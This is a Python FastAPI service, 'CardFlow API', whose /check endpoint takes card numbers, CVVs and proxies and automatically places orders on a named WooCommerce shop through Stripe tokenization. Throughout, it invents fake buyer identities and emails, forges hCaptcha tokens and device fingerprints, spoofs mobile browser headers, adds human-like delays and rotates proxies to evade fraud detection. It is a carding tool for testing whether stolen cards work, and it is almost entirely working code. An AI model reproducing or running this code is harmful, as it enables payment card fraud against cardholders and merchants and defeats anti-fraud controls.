from fastapi import FastAPI, HTTPException, Request
from pydantic import BaseModel, Field
from typing import Optional, Dict, Any, List
import requests
import re
import random
import string
import time
import uuid
from datetime import datetime
import uvicorn

app = FastAPI(
    title="CardFlow API",
    description="WooCommerce checkout automation with Stripe tokenization",
    version="1.2.1"
)

# ─── Request / Response Models ────────────────────────────────────────────────

class CardCheckRequest(BaseModel):
    cc: str = Field(..., description="Card number", example="4242424242424242")
    mm: str = Field(..., description="Expiry month (2 digits)", example="12")
    yy: str = Field(..., description="Expiry year (2 or 4 digits)", example="2027")
    cvx: str = Field(..., description="CVV/CVC", example="123")
    proxy: Optional[str] = Field(
        None,
        description="Proxy URL. Supports: host:port | host:port:user:pass | user:pass@host:port | http://host:port | http://host:port:user:pass | http://user:pass@host:port",
        example="127.0.0.1:8080"
    )

class CardCheckResponse(BaseModel):
    success: bool
    status: str
    message: str
    request_id: str
    timestamp: str
    data: Dict[str, Any]

class HealthResponse(BaseModel):
    status: str
    timestamp: str
    version: str

# ─── Helpers ───────────────────────────────────────────────────────────────────

def generate_request_id() -> str:
    return str(uuid.uuid4())[:8]

def random_email() -> str:
    domains = ["gmail.com", "yahoo.com", "outlook.com", "mail.com", "proton.me"]
    name = "".join(random.choices(string.ascii_lowercase, k=8))
    surname = "".join(random.choices(string.ascii_lowercase, k=6))
    num = random.randint(10, 999)
    return f"{name}{surname}{num}@{random.choice(domains)}"

def random_identity() -> Dict[str, str]:
    first_names = ["James", "John", "Robert", "Michael", "William", "David",
                   "Richard", "Joseph", "Thomas", "Charles", "Mary", "Patricia",
                   "Jennifer", "Linda", "Elizabeth", "Susan", "Jessica", "Sarah",
                   "Karen", "Nancy"]
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia",
                  "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez",
                  "Gonzalez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore",
                  "Jackson", "Martin"]
    streets = ["Main St", "Oak Ave", "Maple Dr", "Cedar Ln", "Pine Rd",
                 "Elm St", "Washington Ave", "Lake Dr"]
    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix",
              "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
    states = ["NY", "CA", "TX", "FL", "IL", "PA", "OH", "GA", "NC", "MI"]
    zip_codes = ["10001", "90210", "77001", "33101", "60601",
                 "19101", "44101", "30301", "27601", "48101"]

    first = random.choice(first_names)
    last = random.choice(last_names)
    return {
        "first_name": first,
        "last_name": last,
        "full_name": f"{first} {last}",
        "street_num": str(random.randint(100, 9999)),
        "street": random.choice(streets),
        "city": random.choice(cities),
        "state": random.choice(states),
        "zip": random.choice(zip_codes),
    }

def random_fingerprint() -> str:
    return "".join(random.choices("abcdef0123456789", k=32))

def human_delay(min_sec: float = 0.5, max_sec: float = 2.5) -> None:
    time.sleep(random.uniform(min_sec, max_sec))

def build_android_headers(host: str, referer: str = "") -> Dict[str, str]:
    base = {
        "user-agent": (
            "Mozilla/5.0 (Linux; Android 16; 2409BRN2CA Build/BP2A.250605.031.A3) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.7827.91 Mobile Safari/537.36"
        ),
        "sec-ch-ua": '"Android WebView";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "x-requested-with": "mark.via.gp",
        "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    if host:
        base["host"] = host
    if referer:
        base["referer"] = referer
    return base

def normalize_proxy(proxy_str: Optional[str]) -> Optional[str]:
    """
    Normalize proxy string to standard http://user:pass@host:port format.
    Supports:
        host:port
        host:port:user:pass
        user:pass@host:port
        http://host:port
        http://host:port:user:pass
        http://user:pass@host:port
    """
    if not proxy_str:
        return None

    proxy = proxy_str.strip()
    protocol = "http"

    if proxy.startswith("http://"):
        protocol = "http"
        proxy = proxy[7:]
    elif proxy.startswith("https://"):
        protocol = "https"
        proxy = proxy[8:]

    user = None
    password = None
    host_port = proxy

    if "@" in proxy:
        creds, host_port = proxy.rsplit("@", 1)
        if ":" in creds:
            user, password = creds.split(":", 1)
    elif proxy.count(":") >= 3:
        parts = proxy.split(":")
        if len(parts) >= 4:
            host = ":".join(parts[:-3])
            port = parts[-3]
            user = parts[-2]
            password = parts[-1]
            host_port = f"{host}:{port}"

    if user and password:
        return f"{protocol}://{user}:{password}@{host_port}"
    return f"{protocol}://{host_port}"

def mask_proxy(proxy_url: Optional[str]) -> Optional[str]:
    if not proxy_url:
        return None
    try:
        from urllib.parse import urlparse
        parsed = urlparse(proxy_url)
        if parsed.username or parsed.password:
            return f"{parsed.scheme}://***:***@{parsed.hostname}:{parsed.port}"
        return proxy_url
    except Exception:
        return "[masked]"

# ─── Core Checkout Flow ────────────────────────────────────────────────────────

def run_checkout(cc: str, mm: str, yy: str, cvx: str, req_id: str, proxy: Optional[str] = None) -> Dict[str, Any]:
    normalized_proxy = normalize_proxy(proxy)
    proxies = {"http": normalized_proxy, "https": normalized_proxy} if normalized_proxy else None
    s = requests.Session()
    if proxies:
        s.proxies.update(proxies)

    identity = random_identity()
    email = random_email()
    fingerprint = random_fingerprint()

    # ── 1. Add to cart ──────────────────────────────────────────────────────
    cart_files = [
        ("attribute_colour", (None, "White")),
        ("attribute_size", (None, "Unisex - S")),
        ("attribute_size", (None, "Unisex - S")),
        ("quantity", (None, "1")),
        ("add-to-cart", (None, "68788")),
        ("product_id", (None, "68788")),
        ("variation_id", (None, "68789")),
    ]
    cart_headers = build_android_headers("sp12shop.com")
    cart_headers.update({
        "cache-control": "max-age=0",
        "upgrade-insecure-requests": "1",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "navigate",
        "sec-fetch-user": "?1",
        "sec-fetch-dest": "document",
        "referer": "https://sp12shop.com/product/chief-football-shirt-taylors-boyfriend-version-swiftie-era-fan-tee-shirts/",
        "priority": "u=0, i",
        "origin": "https://sp12shop.com",
    })

    s.post(
        "https://sp12shop.com/product/chief-football-shirt-taylors-boyfriend-version-swiftie-era-fan-tee-shirts/",
        headers=cart_headers,
        files=cart_files,
    )
    human_delay()

    # ── 2. Cart page (extract nonce) ────────────────────────────────────────
    cart_get_headers = build_android_headers("sp12shop.com")
    cart_get_headers.update({
        "upgrade-insecure-requests": "1",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "sec-fetch-site": "none",
        "sec-fetch-mode": "navigate",
        "sec-fetch-dest": "document",
        "referer": "https://sp12shop.com/product/chief-football-shirt-taylors-boyfriend-version-swiftie-era-fan-tee-shirts/",
        "priority": "u=1, i",
    })

    cart_resp = s.get("https://sp12shop.com/cart/", headers=cart_get_headers)
    nonce_match = re.search(r'"nonce":"([^"]+)"', cart_resp.text)
    nonce = nonce_match.group(1) if nonce_match else None
    human_delay()

    # ── 3. Simulate cart ────────────────────────────────────────────────────
    sim_headers = build_android_headers("sp12shop.com")
    sim_headers.update({
        "content-type": "application/json",
        "accept": "*/*",
        "origin": "https://sp12shop.com",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://sp12shop.com/product/chief-football-shirt-taylors-boyfriend-version-swiftie-era-fan-tee-shirts/",
        "priority": "u=1, i",
    })

    s.post(
        "https://sp12shop.com",
        params={"wc-ajax": "ppc-simulate-cart"},
        headers=sim_headers,
        json={
            "nonce": nonce,
            "products": [{
                "id": "68788",
                "quantity": "1",
                "variations": [
                    {"value": "White", "name": "attribute_colour"},
                    {"value": "Unisex - S", "name": "attribute_size"},
                ],
                "extra": {},
            }],
        },
    )
    human_delay()

    # ── 4. Checkout page (extract sig, session, checkout_nonce) ─────────────
    chk_headers = build_android_headers("sp12shop.com")
    chk_headers.update({
        "upgrade-insecure-requests": "1",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "sec-fetch-site": "none",
        "sec-fetch-mode": "navigate",
        "sec-fetch-dest": "document",
        "referer": "https://sp12shop.com/cart/",
        "priority": "u=1, i",
    })

    chk_resp = s.get("https://sp12shop.com/checkout/", headers=chk_headers)
    chk_text = chk_resp.text

    sig_match = re.search(r"woopaySignatureNonce%22%3A%22([^%]+)", chk_text)
    ses_match = re.search(r"woopaySessionNonce%22%3A%22([^%]+)", chk_text)
    checkout_nonce_match = re.search(r'"nonce":"([^"]+)"', chk_text)

    sig = sig_match.group(1) if sig_match else None
    ses = ses_match.group(1) if ses_match else None
    checkout_nonce = checkout_nonce_match.group(1) if checkout_nonce_match else "f6dbe70d66"
    human_delay()

    # ── 5. Get WooPay signature ─────────────────────────────────────────────
    sig_headers = build_android_headers("sp12shop.com")
    sig_headers.update({
        "accept": "*/*",
        "origin": "https://sp12shop.com",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://sp12shop.com/checkout/",
        "priority": "u=1, i",
    })

    sig_resp = s.post(
        "https://sp12shop.com",
        params={"wc-ajax": "wcpay_get_woopay_signature"},
        headers=sig_headers,
        files={"_ajax_nonce": (None, sig)},
    )
    signature = sig_resp.json().get("data", {}).get("signature", "")
    human_delay()

    # ── 6. Stripe tokenization ──────────────────────────────────────────────
    guid = "".join(random.choices("abcdef0123456789", k=32))
    muid = "".join(random.choices("abcdef0123456789", k=32))
    sid = "".join(random.choices("abcdef0123456789", k=32))
    client_session = "".join(random.choices("abcdef0123456789-", k=36))
    elements_session = "".join(random.choices("abcdef0123456789", k=20))
    hcaptcha_token = "P1_" + "".join(random.choices(string.ascii_letters + string.digits + "-_", k=500))

    stripe_headers = {
        "host": "api.stripe.com",
        "sec-ch-ua-platform": '"Android"',
        "user-agent": (
            "Mozilla/5.0 (Linux; Android 16; 2409BRN2CA Build/BP2A.250605.031.A3) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.7827.91 Mobile Safari/537.36"
        ),
        "accept": "application/json",
        "sec-ch-ua": '"Android WebView";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
        "content-type": "application/x-www-form-urlencoded",
        "sec-ch-ua-mobile": "?1",
        "origin": "https://js.stripe.com",
        "x-requested-with": "mark.via.gp",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://js.stripe.com/",
        "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
        "priority": "u=1, i",
    }

    stripe_data = (
        f'billing_details[name]={identity["first_name"]}+{identity["last_name"]}'
        f'&billing_details[email]={email}'
        f'&billing_details[phone]='
        f'&billing_details[address][city]={identity["city"]}'
        f'&billing_details[address][country]=US'
        f'&billing_details[address][line1]={identity["street_num"]}+{identity["street"].replace(" ", "+")}'
        f'&billing_details[address][line2]='
        f'&billing_details[address][postal_code]={identity["zip"]}'
        f'&billing_details[address][state]={identity["state"]}'
        f'&type=card'
        f'&card[number]={cc}'
        f'&card[cvc]={cvx}'
        f'&card[exp_year]={yy}'
        f'&card[exp_month]={mm}'
        f'&allow_redisplay=unspecified'
        f'&payment_user_agent=stripe.js%2F39914d4bef%3B+stripe-js-v3%2F39914d4bef%3B+payment-element%3B+deferred-intent'
        f'&referrer=https%3A%2F%2Fsp12shop.com'
        f'&time_on_page={random.randint(15000, 60000)}'
        f'&client_attribution_metadata[client_session_id]={client_session}'
        f'&client_attribution_metadata[merchant_integration_source]=elements'
        f'&client_attribution_metadata[merchant_integration_subtype]=payment-element'
        f'&client_attribution_metadata[merchant_integration_version]=2021'
        f'&client_attribution_metadata[payment_intent_creation_flow]=deferred'
        f'&client_attribution_metadata[payment_method_selection_flow]=merchant_specified'
        f'&client_attribution_metadata[elements_session_id]=elements_session_{elements_session}'
        f'&client_attribution_metadata[elements_session_config_id]={"".join(random.choices("abcdef0123456789-", k=36))}'
        f'&client_attribution_metadata[merchant_integration_additional_elements][0]=payment'
        f'&guid={guid}'
        f'&muid={muid}'
        f'&sid={sid}'
        f'&key=pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs'
        f'&radar_options[hcaptcha_token]={hcaptcha_token}'
    )

    stripe_resp = s.post("https://api.stripe.com/v1/payment_methods", headers=stripe_headers, data=stripe_data)
    stripe_json = stripe_resp.json()

    stripe_error = None
    if "error" in stripe_json:
        stripe_error = {
            "message": stripe_json["error"].get("message"),
            "type": stripe_json["error"].get("type"),
            "code": stripe_json["error"].get("code"),
        }
        return {
            "success": False,
            "status": "declined",
            "message": stripe_error["message"] or "Stripe tokenization failed",
            "stripe_error": stripe_error,
            "identity": {k: v for k, v in identity.items() if k not in ("first_name", "last_name")},
            "email": email,
            "proxy_used": mask_proxy(normalized_proxy),
            "proxy_raw": proxy,
        }

    pm = stripe_json.get("id")

    # ── 7. Final checkout ───────────────────────────────────────────────────
    session_pages = str(random.randint(5, 20))
    session_count = str(random.randint(1, 3))

    final_headers = build_android_headers("sp12shop.com")
    final_headers.update({
        "nonce": "126b20a63c",
        "pragma": "no-cache",
        "cache-control": "no-cache",
        "x-wp-nonce": checkout_nonce,
        "accept": "application/json, */*;q=0.1",
        "content-type": "application/json",
        "origin": "https://sp12shop.com",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://sp12shop.com/checkout/",
        "priority": "u=1, i",
    })

    addr_line = f'{identity["street_num"]} {identity["street"]}'

    checkout_payload = {
        "additional_fields": {},
        "billing_address": {
            "first_name": identity["first_name"],
            "last_name": identity["last_name"],
            "company": "",
            "address_1": addr_line,
            "address_2": "",
            "city": identity["city"],
            "state": identity["state"],
            "postcode": identity["zip"],
            "country": "US",
            "email": email,
            "phone": "",
        },
        "create_account": False,
        "customer_note": "",
        "customer_password": "",
        "extensions": {
            "woocommerce/order-attribution": {
                "source_type": "typein",
                "referrer": "(none)",
                "utm_campaign": "(none)",
                "utm_source": "(direct)",
                "utm_medium": "(none)",
                "utm_content": "(none)",
                "utm_id": "(none)",
                "utm_term": "(none)",
                "utm_source_platform": "(none)",
                "utm_creative_format": "(none)",
                "utm_marketing_tactic": "(none)",
                "session_entry": "https://sp12shop.com/",
                "session_start_time": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S"),
                "session_pages": session_pages,
                "session_count": session_count,
                "user_agent": (
                    "Mozilla/5.0 (Linux; Android 16; 2409BRN2CA Build/BP2A.250605.031.A3) "
                    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.7827.91 Mobile Safari/537.36"
                ),
            },
        },
        "shipping_address": {
            "first_name": identity["first_name"],
            "last_name": identity["last_name"],
            "company": "",
            "address_1": addr_line,
            "address_2": "",
            "city": identity["city"],
            "state": identity["state"],
            "postcode": identity["zip"],
            "country": "US",
            "phone": "",
        },
        "payment_method": "woocommerce_payments",
        "payment_data": [
            {"key": "payment_method", "value": "woocommerce_payments"},
            {"key": "wcpay-payment-method", "value": pm},
            {"key": "wcpay-fraud-prevention-token", "value": ""},
            {"key": "wcpay-fingerprint", "value": fingerprint},
            {"key": "wc-woocommerce_payments-new-payment-method", "value": False},
        ],
    }

    final_resp = s.post(
        "https://sp12shop.com/wp-json/wc/store/v1/checkout",
        params={"_locale": "site"},
        headers=final_headers,
        json=checkout_payload,
    )

    try:
        checkout_json = final_resp.json()
    except Exception:
        checkout_json = {"raw_response": final_resp.text, "parse_error": True}

    payment_status = "unknown"
    if "payment_result" in checkout_json:
        payment_status = checkout_json["payment_result"].get("payment_status", "unknown")

    success = payment_status.lower() in ("success", "approved", "completed", "paid")

    return {
        "success": success,
        "status": payment_status if success else "declined",
        "message": checkout_json.get("message", "Checkout processed"),
        "stripe_data": {
            "payment_method_id": pm,
            "card_brand": stripe_json.get("card", {}).get("brand"),
            "card_last4": stripe_json.get("card", {}).get("last4"),
        },
        "checkout_data": checkout_json,
        "identity": {
            "email": email,
            "name": identity["full_name"],
            "address": f'{identity["street_num"]} {identity["street"]}, {identity["city"]}, {identity["state"]} {identity["zip"]}',
        },
        "meta": {
            "request_id": req_id,
            "session_pages": session_pages,
            "session_count": session_count,
            "proxy_used": mask_proxy(normalized_proxy),
            "proxy_raw": proxy,
        },
    }

# ─── API Endpoints ─────────────────────────────────────────────────────────────

@app.get("/", response_model=HealthResponse)
def root():
    return HealthResponse(
        status="running",
        timestamp=datetime.utcnow().isoformat() + "Z",
        version="1.2.1",
    )

@app.get("/health", response_model=HealthResponse)
def health():
    return HealthResponse(
        status="healthy",
        timestamp=datetime.utcnow().isoformat() + "Z",
        version="1.2.1",
    )

@app.post("/check", response_model=CardCheckResponse)
def check_card(payload: CardCheckRequest, request: Request):
    req_id = generate_request_id()
    start = time.time()

    try:
        result = run_checkout(
            cc=payload.cc.replace(" ", ""),
            mm=payload.mm,
            yy=payload.yy,
            cvx=payload.cvx,
            req_id=req_id,
            proxy=payload.proxy,
        )
    except Exception as exc:
        raise HTTPException(
            status_code=500,
            detail={
                "success": False,
                "status": "error",
                "message": str(exc),
                "request_id": req_id,
                "timestamp": datetime.utcnow().isoformat() + "Z",
                "data": {},
            },
        )

    elapsed = round(time.time() - start, 3)

    return CardCheckResponse(
        success=result.get("success", False),
        status=result.get("status", "unknown"),
        message=result.get("message", ""),
        request_id=req_id,
        timestamp=datetime.utcnow().isoformat() + "Z",
        data={
            "elapsed_seconds": elapsed,
            **result,
        },
    )

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)